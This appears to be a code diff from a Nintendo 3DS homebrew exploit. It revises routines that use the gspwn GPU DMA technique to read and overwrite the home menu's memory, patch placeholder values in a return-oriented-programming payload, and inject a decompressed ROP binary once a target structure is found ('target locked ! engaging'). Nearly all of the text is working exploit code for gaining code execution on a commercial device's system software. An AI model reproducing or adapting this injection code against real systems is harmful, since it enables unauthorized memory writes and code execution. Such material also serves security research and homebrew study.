@@ -655,16 +655,16 @@ void _aptExit()
 	svc_closeHandle(aptLockHandle);
 }
 
-void inject_payload(u32* linear_buffer, u32 target_address)
+void inject_payload(u32* linear_buffer, u32 target_address, u32* ropbin_linear_buffer, u32 ropbin_size)
 {
 	u32 target_base = target_address & ~0xFF;
 	u32 target_offset = target_address - target_base;
 
 	//read menu memory
 	{
-		GSP_FlushDCache(linear_buffer, 0x00001000);
+		GSP_FlushDCache(linear_buffer, 0x00002000);
 		
-		doGspwn((u32*)(target_base), linear_buffer, 0x00001000);
+		doGspwn((u32*)(target_base), linear_buffer, 0x00002000);
 	}
 
 	svc_sleepThread(10000000); //sleep long enough for memory to be read
@@ -688,15 +688,30 @@ void inject_payload(u32* linear_buffer, u32 target_address)
 		int i;
 		for(i=0; i<payload_size/4; i++)
 		{
-			if(payload_src[i] < 0xBABE0000+0x100 && payload_src[i] > 0xBABE0000-0x100)
+			const u32 val = payload_src[i];;
+			if(val < 0xBABE0000+0x200 && val > 0xBABE0000-0x200)
 			{
-				payload_dst[i] = payload_src[i] + target_address - 0xBABE0000;
-			}else if(payload_src[i] != 0xDEADCAFE) payload_dst[i] = payload_src[i];
+				payload_dst[i] = val + target_address - 0xBABE0000;
+			}else if((val & 0xFFFFFF00) == 0xFADE0000){
+				switch(val & 0xFF)
+				{
+					case 1:
+						// source ropbin + bkp linear address
+						payload_dst[i] = (u32)ropbin_linear_buffer;
+						break;
+					case 2:
+						// ropbin + bkp size
+						payload_dst[i] = ropbin_size;
+						break;
+				}
+			}else if(val != 0xDEADCAFE){
+				payload_dst[i] = val;
+			}
 		}
 
-		GSP_FlushDCache(linear_buffer, 0x00001000);
+		GSP_FlushDCache(linear_buffer, 0x00002000);
 
-		doGspwn(linear_buffer, (u32*)(target_base), 0x00001000);
+		doGspwn(linear_buffer, (u32*)(target_base), 0x00002000);
 	}
 
 	svc_sleepThread(10000000); //sleep long enough for memory to be written
@@ -752,8 +767,8 @@ int main(u32 loaderparam, char** argv)
 	#endif
 	#endif
 
+	#ifdef UDSPLOIT
 	{
-		// test
 		Result ret = 0;
 
 		s64 tmp = 0;
@@ -779,6 +794,7 @@ int main(u32 loaderparam, char** argv)
 			while(1);
 		}
 	}
+	#endif
 
 	// regionfour stuff
 	drawTitleScreen("searching for target...");
@@ -795,26 +811,22 @@ int main(u32 loaderparam, char** argv)
 		// u32 binsize = (menu_ropbin_bin_size + 0xff) & ~0xff; // Align to 0x100-bytes.
 		u32 binsize = 0x8000; // fuck modularity
 		u32 *ptr32 = (u32*)menu_ropbin_bin;
+		u32* ropbin_linear_buffer = &((u8*)linear_buffer)[block_size];
+		u32* ropbin_bkp_linear_buffer = &((u8*)ropbin_linear_buffer)[MENU_LOADEDROP_BKP_BUFADR - MENU_LOADEDROP_BUFADR];
 
 		// Decompress menu_ropbin_bin into homemenu linearmem.
-		lz11Decompress(&menu_ropbin_bin[4], (u8*)linear_buffer, ptr32[0] >> 8);
+		lz11Decompress(&menu_ropbin_bin[4], (u8*)ropbin_linear_buffer, ptr32[0] >> 8);
 
 		// copy un-processed ropbin to backup location
-		GSP_FlushDCache(linear_buffer, binsize);
-		doGspwn(linear_buffer, (u32*)MENU_LOADEDROP_BKP_BUFADR, binsize);
-		svc_sleepThread(100*1000*1000);
+		memcpy(ropbin_bkp_linear_buffer, ropbin_linear_buffer, MENU_LOADEDROP_BKP_BUFADR - MENU_LOADEDROP_BUFADR);
+		patchPayload(ropbin_linear_buffer, targetProcessIndex, NULL);
+		GSP_FlushDCache(ropbin_linear_buffer, (MENU_LOADEDROP_BKP_BUFADR - MENU_LOADEDROP_BUFADR) * 2);
 
-		patchPayload(linear_buffer, targetProcessIndex, NULL);
-
-		GSP_FlushDCache(linear_buffer, binsize);
-		doGspwn(linear_buffer, (u32*)MENU_LOADEDROP_BUFADR, binsize);
-		svc_sleepThread(100*1000*1000);
-
-		// copy parameter block
-		memset(linear_buffer, 0x00, MENU_PARAMETER_SIZE);
-		GSP_FlushDCache(linear_buffer, MENU_PARAMETER_SIZE);
-		doGspwn(linear_buffer, (u32*)(MENU_PARAMETER_BUFADR), MENU_PARAMETER_SIZE);
-		svc_sleepThread(20*1000*1000);
+		// // copy parameter block
+		// memset(ropbin_linear_buffer, 0x00, MENU_PARAMETER_SIZE);
+		// GSP_FlushDCache(ropbin_linear_buffer, MENU_PARAMETER_SIZE);
+		// doGspwn(ropbin_linear_buffer, (u32*)(MENU_PARAMETER_BUFADR), MENU_PARAMETER_SIZE);
+		// svc_sleepThread(20*1000*1000);
 	#endif
 
 	int cnt = 0;
@@ -833,12 +845,13 @@ int main(u32 loaderparam, char** argv)
 
 		int i;
 		u32 end = block_size/4-0x10;
-		for(i=0; i<end; i++)
+		for(i = 0; i < end; i++)
 		{
 			const u32* adr = &(linear_buffer)[i];
-			if(adr[2]==0x5544 && adr[3]==0x80 && adr[6]!=0x0 && adr[0x1F]==0x6E4C5F4E)break;
+			if(adr[2] == 0x5544 && adr[3] == 0x80 && adr[6]!=0x0 && adr[0x1F] == 0x6E4C5F4E)break;
 		}
-		if(i<end)
+
+		if(i < end)
 		{
 			drawTitleScreen("searching for target...\n    target locked ! engaging.");
 
@@ -848,7 +861,11 @@ int main(u32 loaderparam, char** argv)
 			// drawHex((linear_buffer)[i+6], 100, 50+cnt*10);
 			// drawHex((linear_buffer)[i+0x1f], 200, 50+cnt*10);
 
-			inject_payload(linear_buffer, target_address+0x18);
+			#ifdef LOADROPBIN
+				inject_payload(linear_buffer, target_address + 0x18, ropbin_linear_buffer, (MENU_LOADEDROP_BKP_BUFADR - MENU_LOADEDROP_BUFADR) * 2);
+			#else
+				inject_payload(linear_buffer, target_address + 0x18, NULL, 0);
+			#endif
 
 			block_start = target_address + 0x10 - block_stride;
 			cnt++;
